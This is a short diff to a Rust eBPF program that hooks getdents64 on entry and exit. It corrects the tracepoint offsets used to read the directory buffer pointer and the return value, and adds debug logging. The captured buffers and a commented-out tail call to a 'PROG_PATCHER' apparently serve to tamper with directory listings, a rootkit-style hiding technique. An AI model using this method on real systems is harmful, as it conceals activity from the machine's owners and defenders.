@@ -77,7 +77,7 @@ fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
         "pid is {}, fd is {}, buff_count is 0x{:x}", pid, fd, buff_count
     );
 
-    let dirp: *const linux_dirent64 = unsafe { ctx.read_at(RET as usize).unwrap() };
+    let dirp: *const linux_dirent64 = unsafe { ctx.read_at(24).unwrap() };
     map_buffs.insert(&pid_tgid, &(dirp as u64), 0).unwrap();
     info!(&ctx, "dirp is 0x{:x}", dirp as u64);
     Ok(0)
@@ -88,7 +88,8 @@ fn handle_getdents_exit(ctx: TracePointContext) -> Result<u32, u32> {
     // cat /sys/kernel/debug/tracing/events/syscalls/sys_exit_getdents64/format
     // field:long ret;                         offset:16; size:8; signed:1;
     let pid_tgid = bpf_get_current_pid_tgid();
-    let total_bytes_read: i64 = unsafe { ctx.read_at(16).unwrap() };
+    let total_bytes_read: i64 = unsafe { ctx.read_at(RET as usize).unwrap() };
+    info!(&ctx, "RET is {}", RET);
     info!(&ctx, "total_bytes_read is {}", total_bytes_read);
     // unsafe {
     //     if JUMP_TABLE.tail_call(&ctx, PROG_PATCHER).is_err() {
